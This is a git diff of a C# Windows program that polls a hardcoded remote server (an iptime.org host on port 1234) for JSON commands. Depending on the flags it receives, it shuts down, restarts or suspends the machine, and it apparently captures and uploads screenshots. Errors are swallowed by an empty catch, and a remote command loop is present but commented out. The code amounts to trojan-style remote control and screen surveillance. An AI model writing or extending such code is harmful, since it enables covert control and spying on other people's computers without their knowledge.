@@ -1,4 +1,5 @@
-﻿using System;
+﻿
+using System;
 using System.Net;
 using System.Drawing;
 using System.Diagnostics;
@@ -25,41 +26,46 @@ namespace SCSU
         }
         private void GetPicture_Tick(object sender, EventArgs e)
         {
-            string url = settingJson;
-            WebClient client = new WebClient();
-            JArray setting = JArray.Parse(client.DownloadString(url));
-            if ((bool)setting[0])
+            try
             {
-                System.Diagnostics.Process.Start("shutdown.exe", "-s -t 0");
-            }
-            else if ((bool)setting[1])
-            {
-                System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
-            }
-            else if ((bool)setting[2])
-            {
-                Application.SetSuspendState(PowerState.Suspend, false, false);
-            }
-            else if ((bool)setting[3])
-            {
-                setting["havemessage"] = false;
-                Thread thread = new Thread(new ThreadStart(showMessagebox));
-                thread.Start();
-            }
-            if ((bool)setting["cmd"] != cmd)
-            {
-                cmd = (bool)setting["cmd"];
-                System.Threading.Thread cmdthread = new Thread(new ThreadStart(cmdloop));
-                cmdthread.Start();
-            }
-            if ((bool)setting["taskmgr"] != taskmgr)
-            {
-                taskmgr = (bool)setting["taskmgr"];
-                if (taskmgr)
+                string url = settingJson;
+                WebClient client = new WebClient();
+                JArray setting = JArray.Parse(client.DownloadString(url));
+                if ((bool)setting[0])
                 {
-
+                    System.Diagnostics.Process.Start("shutdown.exe", "-s -t 0");
                 }
+                else if ((bool)setting[1])
+                {
+                    System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
+                }
+                else if ((bool)setting[2])
+                {
+                    Application.SetSuspendState(PowerState.Suspend, false, false);
+                }
+                else if ((bool)setting[3])
+                {
+                    Thread thread = new Thread(new ThreadStart(showMessagebox));
+                    thread.Start();
+                }
+
+
+                /*if ((bool)setting["cmd"] != cmd)
+                {
+                    cmd = (bool)setting["cmd"];
+                    System.Threading.Thread cmdthread = new Thread(new ThreadStart(cmdloop));
+                    cmdthread.Start();
+                }
+                if ((bool)setting["taskmgr"] != taskmgr)
+                {
+                    taskmgr = (bool)setting["taskmgr"];
+                    if (taskmgr)
+                    {
+
+                    }
+                }*/
             }
+            catch { }
         }
         private void cmdloop ()
         {
@@ -138,8 +144,9 @@ namespace SCSU
             else
             {
                 string[] toUrl = macadress.Split(';');
-                captureText = toUrl[0];
-                settingJson = toUrl[1];
+                captureText = "http://2019swag.iptime.org:1234" + toUrl[0];
+                settingJson = "http://2019swag.iptime.org:1234" + toUrl[1];
+                GetPicture.Enabled = true;
                 Thread thread = new Thread(new ThreadStart(loop));
                 thread.Start();
             }
